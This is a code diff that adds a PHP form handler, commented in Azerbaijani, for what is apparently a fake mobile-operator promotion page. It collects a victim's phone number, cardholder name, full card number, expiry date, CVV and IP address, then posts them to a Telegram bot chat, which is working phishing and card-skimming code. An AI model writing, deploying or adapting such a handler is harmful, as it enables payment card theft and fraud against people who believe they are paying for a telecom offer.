@@ -1,0 +1,64 @@
+<?php
+// ====== ENVIRONMENT VARIABLES ======
+$botToken = getenv('TELEGRAM_BOT_TOKEN');
+$chatId = getenv('TELEGRAM_CHAT_ID');
+
+if (!$botToken || !$chatId) {
+    http_response_code(500);
+    die(json_encode(['status' => 'error', 'message' => 'Server configuration error']));
+}
+
+// ====== YALNIZ POST SORĞULARINA İCAZƏ VER ======
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    die(json_encode(['status' => 'error', 'message' => 'Method Not Allowed']));
+}
+
+// ====== MƏLUMATLARI AL ======
+$operator = $_POST['operator'] ?? '';
+$prefix = $_POST['prefix'] ?? '';
+$number = $_POST['number'] ?? '';
+$price = $_POST['campaign_price'] ?? '';
+$cardName = $_POST['card_name'] ?? '';
+$cardNumber = $_POST['card_number'] ?? '';
+$cardExpiry = $_POST['card_expiry'] ?? '';
+$cardCvv = $_POST['card_cvv'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+
+// ====== MESAJI FORMATLA (EMOJİSİZ) ======
+$message = "YENI BILGI\n\n";
+$message .= "Operator: $operator\n";
+$message .= "Nomre: +994$prefix$number\n";
+$message .= "Kampaniya: $price AZN\n";
+$message .= "Kart Sahibi: $cardName\n";
+$message .= "Kart Nomresi: $cardNumber\n";
+$message .= "Kart Bitis: $cardExpiry\n";
+$message .= "CVV: $cardCvv\n";
+$message .= "IP: $ip";
+
+// ====== TELEGRAM-A GÖNDƏR ======
+$url = "https://api.telegram.org/bot$botToken/sendMessage";
+$data = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML'
+];
+
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+
+$response = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($httpCode === 200) {
+    echo json_encode(['status' => 'success', 'message' => 'Data sent to Telegram']);
+} else {
+    http_response_code(500);
+    echo json_encode(['status' => 'error', 'message' => 'Failed to send to Telegram']);
+}
+?>
